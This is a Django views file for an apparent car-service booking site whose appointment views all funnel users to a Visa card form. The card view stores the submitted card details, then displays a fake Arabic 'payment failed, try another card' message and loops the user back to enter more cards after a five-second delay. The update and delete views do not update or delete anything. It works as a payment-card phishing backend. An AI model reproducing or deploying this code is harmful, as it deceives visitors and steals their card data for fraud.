from django.shortcuts import render,redirect
from .forms import CarSanForm,VisaCardForm
import time
from django.contrib import messages

# Create your views here.



def Home(request):
    return render(request,'Home.html')

def contact(request):
    return render(request,'contact.html')




def createappointment(request):
    if request.method == 'POST':
        form = CarSanForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('accounts:VisaCard_create')  # إعادة التوجيه بعد الحفظ
    else:
        form = CarSanForm()

    return render(request,'createappointment.html', {'form': form})







def updateappointment(request):
    if request.method == 'POST':
        form = CarSanForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('accounts:VisaCard_create')  # إعادة التوجيه بعد الحفظ
    else:
        form = CarSanForm()

    return render(request,'updateappointment.html', {'form': form})



def deletappointment(request):
    if request.method == 'POST':
        form = CarSanForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('accounts:VisaCard_create')  # إعادة التوجيه بعد الحفظ
    else:
        form = CarSanForm()

    return render(request,'deletappointment.html', {'form': form})




def create_visa_card(request):
    if request.method == 'POST':
        form = VisaCardForm(request.POST)
        if form.is_valid():
            form.save()
            messages.success(request, 'مشكلة في عملية الدفع برجاء المحاوله ببطاقة اخري أوالمحاولة في وقت اخر')

            return redirect('accounts:erro_visa')  # إعادة التوجيه بعد الحفظ
    else:
        form = VisaCardForm()

    return render(request, 'visa_card_form.html', {'form': form})



def erro_visa(request):
    if request.method == 'GET':
        time.sleep(5)
        return redirect('accounts:VisaCard_create')
    return render(request, 'error_visa.html')